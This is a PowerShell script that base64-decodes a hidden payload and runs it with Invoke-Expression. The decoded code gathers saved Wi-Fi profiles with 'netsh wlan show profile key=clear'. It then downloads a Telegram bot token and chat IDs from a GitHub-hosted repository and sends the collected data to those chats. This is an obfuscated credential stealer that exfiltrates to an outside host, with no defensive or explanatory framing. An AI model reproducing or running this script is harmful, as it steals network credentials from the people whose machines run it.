$encodedScript = 'ZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICMgRGVmaW5pciBsb3MgdGV4dG9zIGVuIGRpZmVyZW50ZXMgaWRpb21hcw0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICA9ICdQZXJmaWwgZGUgdG9kb3MgbG9zIHVzdWFyaW9zJw0KICAgICAgICAgICAgJ3Byb2ZpbGVfbm90X2ZvdW5kX3RleHQnID0gJ05vIHNlIGVuY3VlbnRyYSBlbCBwZXJmaWwnDQogICAgICAgICAgICAnc3NpZF9uYW1lX3RleHQnICAgICAgICAgPSAnTm9tYnJlIGRlIFNTSUQnDQogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgPSAnVGlwbyBkZSByZWQnDQogICAgICAgICAgICAnYXV0aGVudGljYXRpb25fdGV4dCcgICAgPSAnQXV0ZW50aWNhY2nDs24nDQogICAgICAgICAgICAnZW5jcnlwdGlvbl90ZXh0JyAgICAgICAgPSAnQ2lmcmFkbycNCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICA9ICdDb250ZW5pZG8gZGUgbGEgY2xhdmUnDQogICAgICAgIH0NCiAgICAgICAgJ2VuLUVOJyA9IEB7DQogICAgICAgICAgICAndXNlcl9wcm9maWxlc190ZXh0JyAgICAgPSAnQWxsIFVzZXIgUHJvZmlsZScNCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyA9ICdQcm9maWxlIG5vdCBmb3VuZCcNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICA9ICdTU0lEIG5hbWUnDQogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgPSAnTmV0d29yayBUeXBlJw0KICAgICAgICAgICAgJ2F1dGhlbnRpY2F0aW9uX3RleHQnICAgID0gJ0F1dGhlbnRpY2F0aW9uJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgID0gJ0NpcGhlcicNCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICA9ICdLZXkgQ29udGVudCcNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMgT2J0ZW5lciBlbCBjb25qdW50byBkZSB0ZXh0b3Mgc2Vnw7puIGVsIGlkaW9tYSBzZWxlY2Npb25hZG8NCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIEdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICAjIFV0aWxpemFyIFtyZWdleF06Ok1hdGNoIHBhcmEgb2J0ZW5lciB1bmEgY29pbmNpZGVuY2lhIGV4YWN0YQ0KICAgICAgICAkbWF0Y2ggPSBbcmVnZXhdOjpNYXRjaCgkaW5wdXRUZXh0LCAiXGIkbmFtZVN0cmluZ1xiIiwgW1N5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleE9wdGlvbnNdOjpJZ25vcmVDYXNlKQ0KICAgICAgICBpZiAoJG1hdGNoLlN1Y2Nlc3MpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsIiIgLXJlcGxhY2UgJ1xzKiQnDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KDQogICAgJFByb2ZpbGVzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAjIFVzYXIgbGEgZnVuY2nDs24gR2V0VmFsdWVCeU5hbWUgcGFyYSBvYnRlbmVyIHBlcmZpbGVzDQogICAgICAgIEdldFZhbHVlQnlOYW1lICRfICRMQU5HWydzc2lkX25hbWVfdGV4dCddDQogICAgfQ0KDQogICAgJFdMQU5fUHJvZmlsZXMgPSBAKCkNCg0KICAgICRQcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJHdsYW5fUHJvZmlsZSA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlICRfIGtleT1jbGVhcg0KDQogICAgICAgICMgVmVyaWZpY2FyIHNpIGVsIHBlcmZpbCBubyBzZSBlbmN1ZW50cmEgeSBvbWl0aXJsbw0KICAgICAgICBpZiAoJHdsYW5fUHJvZmlsZSAtY29udGFpbnMgJExBTkdbJ3Byb2ZpbGVfbm90X2ZvdW5kX3RleHQnXSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCg0KICAgICAgICAkSW50ZXJmYWNlTmFtZSA9IEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ3NzaWRfbmFtZV90ZXh0J10NCg0KICAgICAgICBpZiAoJEludGVyZmFjZU5hbWUpIHsNCiAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gJEludGVyZmFjZU5hbWUuVHJpbSgnIicpDQoNCiAgICAgICAgICAgICMgQ29ycmVnaXIgY2FyYWN0ZXJlcyBlc3BlY2lhbGVzIHNpIGVzIG5lY2VzYXJpbw0KICAgICAgICAgICAgJEludGVyZmFjZU5hbWUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpHZXRFbmNvZGluZygiSVNPLTg4NTktMSIpLkdldEJ5dGVzKCRJbnRlcmZhY2VOYW1lKSkNCg0KICAgICAgICAgICAgIyBDcmVhciB1biBvYmpldG8gcGVyc29uYWxpemFkbyBwYXJhIGFsbWFjZW5hciBsYSBpbmZvcm1hY2nDs24gZGVsIHBlcmZpbA0KICAgICAgICAgICAgJHJvdyA9IFtQU0N1c3RvbU9iamVjdF1Aew0KICAgICAgICAgICAgICAgIEludGVyZmFjZU5hbWUgICA9ICRJbnRlcmZhY2VOYW1lDQogICAgICAgICAgICAgICAgU1NJRCAgICAgICAgICAgID0gJEludGVyZmFjZU5hbWUNCiAgICAgICAgICAgICAgICBOZXR3b3JrVHlwZSAgICAgPSAiIg0KICAgICAgICAgICAgICAgIEF1dGhlbnRpY2F0aW9uICA9ICIiDQogICAgICAgICAgICAgICAgRW5jcnlwdGlvbiAgICAgID0gIiINCiAgICAgICAgICAgICAgICBLZXkgICAgICAgICAgICAgPSAiIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjIEFncmVnYXIgZWwgb2JqZXRvIGEgbGEgbGlzdGEgZGUgcGVyZmlsZXMNCiAgICAgICAgICAgICRXTEFOX1Byb2ZpbGVzICs9ICRyb3cNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICgkV0xBTl9Qcm9maWxlcy5Db3VudCAtZ3QgMCkgew0KICAgICAgICAjIE1vc3RyYXIgbGEgY2FudGlkYWQgdG90YWwgZGUgcGVyZmlsZXMgV0xBTiBlbmNvbnRyYWRvcw0KICAgICAgICBXcml0ZS1PdXRwdXQgIlRvdGFsIFdMQU5fUHJvZmlsZXM6ICQoJFdMQU5fUHJvZmlsZXMuQ291bnQpIg0KDQogICAgICAgICMgTW9zdHJhciBsYSBsaXN0YSBkZSBwZXJmaWxlcyBXTEFODQogICAgICAgICRXTEFOX1Byb2ZpbGVzIHwgU2VsZWN0LU9iamVjdCBTU0lELCBBdXRoZW50aWNhdGlvbiwgS2V5LCBFbmNyeXB0aW9uLCBOZXR3b3JrVHlwZQ0KICAgIH0gZWxzZSB7DQogICAgICAgIFdyaXRlLU91dHB1dCAnTm8gV0xBTiBQcm9maWxlcyBmb3VuZCEnDQogICAgfQ0KfQ0KDQojIEVqZWN1dGFyIGxhIGZ1bmNpw7NuIEdldC1XTEFOX1Byb2ZpbGVzIHkgYWxtYWNlbmFyIGVsIHJlc3VsdGFkbw0KJHJlc3VsdCA9IEdldC1XTEFOX1Byb2ZpbGVzDQoNCiMgQ29uZmlndXJhY2nDs24gZGUgVGVsZWdyYW0NCiR0b2tlbkNvbmZpZyA9IEludm9rZS1SZXN0TWV0aG9kICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy9jb25maWcyLnR4dCINCiRjaGF0SWRzID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL3VzdWFyaW8vbHVpc2hpbm8udHh0Ig0KDQojIEVudmlhciBlbCByZXN1bHRhZG8gY29tbyBtZW5zYWplIGEgY2FkYSBJRCBkZSBjaGF0DQpmb3JlYWNoICgkY2hhdElkIGluICRjaGF0SWRzKSB7DQogICAgU2VuZC1UZWxlZ3JhbU1lc3NhZ2UgLXRva2VuICR0b2tlbkNvbmZpZyAtY2hhdElkICRjaGF0SWQgLW1lc3NhZ2UgJHJlc3VsdA0KfQ0K'
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
